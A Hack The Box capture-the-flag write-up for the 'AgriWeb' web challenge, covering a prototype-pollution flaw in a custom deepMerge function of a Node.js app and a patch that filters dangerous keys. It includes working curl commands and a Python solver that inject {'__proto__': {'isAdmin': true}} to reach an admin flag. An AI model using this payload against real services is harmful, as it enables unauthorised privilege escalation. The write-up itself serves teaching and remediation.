<div align="center">

# AgriWeb -- HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Solved-success?style=for-the-badge)

<img src="../../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Challenge Information

| Field      | Value         |
|------------|---------------|
| Name       | AgriWeb       |
| Category   | Web           |
| Difficulty | Easy          |
| Points     | 20            |
| Creator    | lordrukie     |

## Table of Contents

1. [Scenario](#scenario)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Identifying the Vulnerability](#identifying-the-vulnerability)
5. [Exploitation -- Prototype Pollution](#exploitation----prototype-pollution)
6. [Understanding the Solver](#understanding-the-solver)
7. [Patching the Vulnerability](#patching-the-vulnerability)
8. [Verification and Flag](#verification-and-flag)
9. [Flag](#flag)
10. [Key Takeaways](#key-takeaways)

## Scenario

> *"Digital farmlands lie ruined as drones spin out of control and greenhouses overheat; the white-hats must infiltrate the corrupted AgriWeb interface and bring the fields back to life."*

We are presented with the familiar **HTB Editor** -- a browser-based code editor that exposes the source code of a Node.js farming dashboard application. Our objective is to identify the vulnerability, exploit it, then patch the code and pass verification.

**Target:** `<CHALLENGE_IP>:<PORT>`

---

## Initial Reconnaissance

### Retrieving the Directory Structure

```bash
curl -s http://<CHALLENGE_IP>:<PORT>/api/directory | python3 -m json.tool
```

The project layout:

```
.
├── app.js
├── routes/
│   ├── auth.js
│   └── profile.js
├── utils/
│   └── jwt.js
├── exploit/
│   └── solver.py
└── package.json
```

### Reading Key Source Files

```bash
# Read the profile routes (contains the vulnerability)
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=routes/profile.js"

# Read the authentication routes
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=routes/auth.js"

# Read the JWT utility
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=utils/jwt.js"

# Read the main application file
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=app.js"

# Read the provided exploit
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=exploit/solver.py"
```

---

## Source Code Analysis

### Application Overview

AgriWeb is a farming dashboard built with **Express.js**. It provides:

- User registration and authentication via JWT
- User profile management with a profile update endpoint
- An admin panel at `/challenge/admin` that returns the flag

The application uses JWT tokens for session management, and the admin panel is protected by a simple property check on the request user object.

### The Vulnerable Function -- `routes/profile.js`

The profile update route uses a custom `deepMerge()` function to merge user-supplied data into the existing profile object:

```javascript
// routes/profile.js -- VULNERABLE VERSION

function deepMerge(target, source) {
    for (let key in source) {
        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

router.post('/profile', requireAuth, (req, res) => {
    const updatedProfile = deepMerge(req.user.profile || {}, req.body);
    // ... save profile
    res.json({ message: 'Profile updated', profile: updatedProfile });
});
```

### The Admin Check -- `app.js`

The admin route is protected by a property check:

```javascript
// app.js
app.get('/challenge/admin', requireAuth, (req, res) => {
    if (!req.user.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    res.json({ flag: FLAG });
});
```

### JWT Generation -- `utils/jwt.js`

The JWT utility only sets `isAdmin: true` for users that are actual admins in the database:

```javascript
// utils/jwt.js
function generateToken(user) {
    const payload = {
        id: user.id,
        username: user.username
    };
    if (user.role === 'admin') {
        payload.isAdmin = true;
    }
    return jwt.sign(payload, SECRET, { expiresIn: '1h' });
}
```

Regular users never have `isAdmin` set in their token. The decoded user object therefore has no `isAdmin` property, meaning `req.user.isAdmin` is `undefined`, which is falsy -- access denied. Under normal circumstances.

---

## Identifying the Vulnerability

**Vulnerability Type:** Prototype Pollution

The `deepMerge()` function iterates over every key in the user-supplied `source` object using a `for...in` loop. Critically, it does **not** filter out dangerous keys:

- `__proto__`
- `constructor`
- `prototype`

In JavaScript, every object has a hidden `__proto__` property that points to its prototype. When `JSON.parse()` processes a JSON string containing `"__proto__"`, it creates a regular property named `__proto__`. When `deepMerge()` encounters this key and recurses into it, it writes properties directly onto `Object.prototype` -- the prototype of **all** objects in the runtime.

### The Attack Chain

1. Attacker sends `{"__proto__": {"isAdmin": true}}` as the profile update body.
2. `deepMerge()` encounters the key `__proto__` in the source object.
3. It accesses `target["__proto__"]`, which resolves to `Object.prototype`.
4. It sets `Object.prototype.isAdmin = true`.
5. Now **every object** in the process inherits `isAdmin: true`.
6. When the admin route checks `req.user.isAdmin`, it finds `true` via the prototype chain.
7. The flag is returned.

---

## Exploitation -- Prototype Pollution

### Step 1: Register and Authenticate

```bash
# Register
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker"}'

# Login and capture the JWT token
TOKEN=$(curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token: $TOKEN"
```

### Step 2: Pollute the Prototype

Send the malicious profile update payload:

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/profile" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"__proto__": {"isAdmin": true}}'
```

After this request, `Object.prototype.isAdmin` is `true` for the entire Node.js process.

### Step 3: Access the Admin Panel

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/challenge/admin" \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{
  "flag": "HTB{pr0totyp3_p0llut10n_████████████████████████}"
}
```

Even though our JWT token does not contain `isAdmin`, the property is now inherited from `Object.prototype` by every object -- including `req.user`.

---

## Understanding the Solver

The provided `exploit/solver.py` automates the full attack:

```python
# exploit/solver.py (key logic)

import requests

BASE = f"http://{HOST}:{PORT}/challenge"
s = requests.Session()

# 1. Register a regular user
s.post(f"{BASE}/api/auth/register", json={
    "username": "hacker",
    "password": "hacker"
})

# 2. Login and capture the JWT
resp = s.post(f"{BASE}/api/auth/login", json={
    "username": "hacker",
    "password": "hacker"
})
token = resp.json()["token"]

headers = {"Authorization": f"Bearer {token}"}

# 3. Prototype pollution via profile update
s.post(f"{BASE}/api/profile", json={
    "__proto__": {"isAdmin": True}
}, headers=headers)

# 4. Access admin panel -- isAdmin is now inherited from Object.prototype
resp = s.get(f"{BASE}/admin", headers=headers)
flag = resp.json()["flag"]
print(f"[+] Flag: {flag}")
```

The solver is concise because prototype pollution is a single-request attack. The complexity is in understanding *why* it works, not in the mechanics of delivering the payload.

---

## Patching the Vulnerability

The fix is to **sanitize dangerous keys** inside the `deepMerge()` function so that `__proto__`, `constructor`, and `prototype` are never processed.

### Vulnerable Code

```javascript
// BEFORE -- no key filtering
function deepMerge(target, source) {
    for (let key in source) {
        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### Patched Code

```javascript
// AFTER -- dangerous keys are rejected
function deepMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;

        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

The single added line:

```javascript
if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
```

This ensures that no user-supplied input can modify the object prototype chain. The `continue` statement skips the dangerous key entirely, including any nested properties it might carry.

### Applying the Patch via the Editor API

```bash
# Save the patched file
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/save" \
  -H "Content-Type: application/json" \
  -d '{"path":"routes/profile.js","content":"<PATCHED_CONTENT>"}'
```

Replace `<PATCHED_CONTENT>` with the full contents of `routes/profile.js` including the key sanitization fix shown above.

---

## Verification and Flag

### Restart the Application

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/restart"
```

### Run the Verifier

The verifier runs the solver against the patched application. With the fix in place, prototype pollution fails, `isAdmin` is never set on `Object.prototype`, and the solver cannot access the admin panel. The verifier confirms the patch is correct:

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/api/verify"
```

Expected response:

```json
{"message": "Congratulations!", "flag": "HTB{pr0totyp3_p0llut10n_████████████████████████}"}
```

---

## Flag

| Field | Value                                                  |
|-------|--------------------------------------------------------|
| Flag  | `HTB{pr0totyp3_p0llut10n_████████████████████████}` |

---

## Key Takeaways

1. **Prototype pollution is a JavaScript-specific vulnerability class.** It exploits the language's prototype-based inheritance model. Any function that recursively merges user input into objects without key filtering is a potential vector.

2. **Never trust user-controlled keys in merge operations.** The `__proto__`, `constructor`, and `prototype` keys must always be blocked. Libraries like `lodash` have had CVEs for exactly this issue (e.g., CVE-2019-10744).

3. **The impact of prototype pollution is process-wide.** Once `Object.prototype` is modified, every object in the Node.js process inherits the polluted properties. This can lead to privilege escalation (as seen here), denial of service, or even remote code execution in some frameworks.

4. **Use `Object.create(null)` for safe merge targets.** Objects created with `Object.create(null)` have no prototype, making them immune to prototype pollution via `__proto__`. Alternatively, use `Object.hasOwnProperty()` checks or `Map` objects.

5. **Prefer established libraries with known-safe implementations.** Writing custom `deepMerge` functions is risky. Use well-maintained libraries that have addressed prototype pollution, and keep them updated.

6. **Defense in depth applies here too.** Even if the merge function were safe, the admin check could use `req.user.hasOwnProperty('isAdmin')` or check `Object.hasOwn(req.user, 'isAdmin')` to avoid reading inherited properties.

---

<div align="center">

**Written by MrsNobody**

<img src="../../assets/MrsNobody.png" width="80">

*Hack The Box -- AgriWeb*

</div>

<!--
  SEO Keywords:
  HackTheBox, HTB, AgriWeb, writeup, walkthrough, challenge, web,
  prototype pollution, __proto__, constructor, deepMerge, JavaScript,
  Node.js, Express.js, JWT, privilege escalation, isAdmin, admin bypass,
  object prototype, Object.prototype, merge vulnerability, recursive merge,
  CTF, capture the flag, cybersecurity, penetration testing, white-hat,
  lordrukie, easy, web exploitation, OWASP, injection, server-side,
  farming dashboard, property injection, key sanitization
-->
